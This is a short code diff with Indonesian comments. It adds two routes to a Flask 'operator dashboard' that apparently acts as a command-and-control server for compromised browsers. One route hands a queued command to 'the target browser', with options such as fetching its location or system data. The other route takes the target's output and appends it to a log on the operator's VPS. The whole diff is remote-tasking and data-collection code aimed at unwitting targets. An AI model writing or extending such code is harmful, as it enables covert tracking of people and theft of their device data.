@@ -129,6 +129,27 @@ def operator_dashboard():
         </body>
     </html>
     '''
+CURRENT_COMMAND = "ambil_lokasi" # Pilihan perintah: cek_baterai, ambil_data_sistem, ambil_lokasi, ping_test
+
+@app.route('/poll_command')
+def poll_command():
+    # Mengirimkan perintah yang sedang aktif ke browser target
+    global CURRENT_COMMAND
+    cmd = CURRENT_COMMAND
+    return jsonify({"command": cmd})
+
+@app.route('/report_output', methods=['POST'])
+def report_output():
+    try:
+        data = request.json
+        if data and 'output' in data:
+            # Catat hasil keluaran perintah dari target ke dalam berkas log utama VPS
+            with open(LOG_FILE, "a") as f:
+                f.write(f"{data['output']}\n")
+            return jsonify({"status": "success"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+    return jsonify({"status": "failed"}), 400
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
